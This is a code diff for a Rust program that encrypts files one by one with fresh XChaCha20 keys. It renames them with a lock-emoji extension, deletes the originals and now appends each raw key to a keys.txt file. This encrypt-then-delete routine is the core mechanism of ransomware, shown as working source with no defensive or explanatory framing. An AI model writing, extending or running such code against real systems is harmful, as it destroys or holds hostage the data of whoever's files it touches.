@@ -1,9 +1,13 @@
-use std::fs;
+use std::io::Write;
+use std::{fs, path::Path};
 use std::path::PathBuf;
 use anyhow::{Result, Ok};
 use orion::aead;
 
 const ENCRYPTED_EXTENSION:	&str	= ".🔒";
+const KEY_FILE_NAME:		&str	= "keys.txt";
+
+type CipherAndKey = (Vec<u8>, aead::SecretKey);
 
 // TODO: use streams
 // current code isn't capable of encrypting giant files due
@@ -38,22 +42,35 @@ fn encrypt_file(path: PathBuf) -> Result<()> {
 
 		// Prepare new file data
 		let content = fs::read(&path)?;
-		let encrypted_data = encrypt_xchacha20(&content[..])?;
+		let (ciphertext, key) = encrypt_xchacha20(&content[..])?;
 
 		// Write encrypted data to new file
-		fs::write(&encrypted_path, &encrypted_data[..])?;
+		fs::write(&encrypted_path, &ciphertext[..])?;
+		append_file(KEY_FILE_NAME, key.unprotected_as_bytes())?;
 		fs::remove_file(&path)?;
 	}
 
 	Ok(())
 }
 
-fn encrypt_xchacha20(src: &[u8]) -> Result<Vec<u8>> {
+fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
 	// check this: https://docs.rs/orion/latest/orion/aead/index.html
 
 	let secret_key = aead::SecretKey::default();
 	let ciphertext = aead::seal(&secret_key, src)?;
 	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
 
-	Ok(ciphertext)
+	Ok(
+		(ciphertext, secret_key)
+	)
+}
+
+fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> Result<()> {
+	let mut file = fs::OpenOptions::new()
+		.append(true)
+		.open(path)?;
+
+	file.write(data)?;
+
+	Ok(())
 }
